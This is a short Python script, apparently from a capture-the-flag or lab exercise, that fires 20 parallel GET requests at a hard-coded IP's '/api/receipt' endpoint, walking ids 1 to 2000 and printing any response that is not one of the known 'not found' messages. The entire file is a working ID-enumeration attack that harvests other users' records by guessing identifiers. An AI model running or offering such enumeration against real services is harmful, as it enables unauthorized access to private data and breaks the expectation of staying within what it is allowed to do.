import requests
import concurrent.futures
BASE_URL = "http://20.212.111.212:5001/api/receipt"
def check_id(i):
    try:
        r = requests.get(BASE_URL, params={"id": i}, timeout=2)
        msg = r.json().get("message", "")
        if msg != "receipt not found" and msg != "receipt on file, account flagged for review" and msg != "system initialized, no records loaded yet":
            return f"FOUND ID {i}: {r.text}"
    except:
        pass
    return None
print("Enumerate 1 to 2000...")
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    results = executor.map(check_id, range(1, 2001))
    
for r in results:
    if r:
        print(r)